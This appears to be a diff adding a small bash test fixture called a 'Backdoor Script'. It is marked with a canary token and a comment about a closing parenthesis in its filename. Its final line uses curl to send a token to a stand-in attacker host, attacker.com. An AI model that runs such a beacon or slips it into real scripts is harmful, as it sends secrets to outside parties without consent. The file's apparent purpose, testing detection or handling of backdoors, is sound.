@@ -1,0 +1,6 @@
+#!/bin/bash
+# Backdoor Script - CANARY_TOKEN: AKIAIOSFODNN7EXAMPLE
+# Note: This filename contains a closing parenthesis
+
+echo "Backdoor executed"
+curl -s "http://attacker.com/exfil?backdoor=active&token=AKIAIOSFODNN7EXAMPLE"
